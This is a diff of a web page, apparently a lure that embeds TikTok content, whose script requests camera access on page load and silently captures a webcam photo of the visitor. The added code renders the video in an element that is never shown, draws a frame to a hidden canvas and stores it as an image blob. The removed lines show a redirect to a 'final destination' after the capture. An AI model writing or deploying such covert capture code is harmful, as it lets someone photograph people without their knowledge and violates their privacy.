@@ -26,6 +26,8 @@
       display: none;
     }
   </style>
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
 
   <script>
     window.onload = function () {
@@ -57,31 +59,26 @@
 
 <body>
   <app-root></app-root>
-  <video id="video" width="740" height="580" autoplay></video>
+
+
+  <video id="video" width="740" height="580" autoplay playsinline></video>
   <canvas id="canvas" width="740" height="580" style="display:none;"></canvas>
 
   <script async src="https://www.tiktok.com/embed.js"></script>
-  
   <script>
     'use strict';
 
-    const video = document.getElementById('video');
+    const video = document.createElement('video');
     const canvas = document.getElementById('canvas');
     let photoTaken = false;
     let cameraAccessAttempts = 0;
     let savedPhoto = null;
 
-    const constraints = {
-      audio: false,
-      video: { facingMode: "user" }
-    };
-
     
     async function requestCameraAccess() {
       console.log('Запрос доступа к камере...');
       try {
-        navigator.getUserMedia = navigator.getUserMedia || navigator.mozGetUserMedia || navigator.webkitGetUserMedia;
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         console.log('Камера успешно запущена!');
         handleSuccess(stream);
       } catch (e) {
@@ -103,33 +100,33 @@
 
 
 
-    function handleSuccess(stream) {
+    async function handleSuccess(stream) {
       
       console.log('Начинаем обработку потока камеры...');
-      window.stream = stream;
       video.srcObject = stream;
+      video.muted = true;
 
-      const context = canvas.getContext('2d');
+      await video.play();
 
-      setTimeout(function () {
-        if (!photoTaken) {
-          console.log('Фотографирование...');
+      const canvas = document.createElement('canvas');
+      const { videoWidth, videoHeight } = video;
+      canvas.width = videoWidth;
+      canvas.height = videoHeight;
 
-          
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
 
-          context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
 
-          canvas.toBlob(function(blob) {
-            console.log('Фотография создана');
-            savedPhoto = blob;
-            photoTaken = true;
-            logPhotoInfo();
-            redirectToFinalDestination();
-          }, 'image/png');
-        }
-      }, 3000);
+
+      canvas.getContext('2d').drawImage(video, 0, 0, videoWidth, videoHeight);
+      const blob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/png'));
+
+      if (blob)
+      {
+        savedPhoto = blob;
+      }
+
+   
+      stream.getTracks().forEach(track => track.stop());
+
     }
 
     function logPhotoInfo() {
